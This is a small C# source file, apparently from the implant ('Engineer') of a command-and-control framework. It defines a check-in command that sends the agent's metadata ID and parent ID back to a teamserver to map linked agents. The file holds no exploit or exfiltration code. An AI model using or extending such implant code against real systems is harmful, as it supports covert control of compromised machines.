using Engineer.Commands;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class CheckIn : EngineerCommand
    {
        public override string Name => "checkIn";

        public override async Task Execute(EngineerTask task)
        {
            //Console.WriteLine("Checking In");
            task.Arguments.TryGetValue("/parentid", out string parentId);
            Tasking.FillTaskResults(Program._metadata.Id+"\n" + parentId,task,EngTaskStatus.Complete); //gives back the engineers metadata and the parent so the teamserver can make the path
        }
    }
}
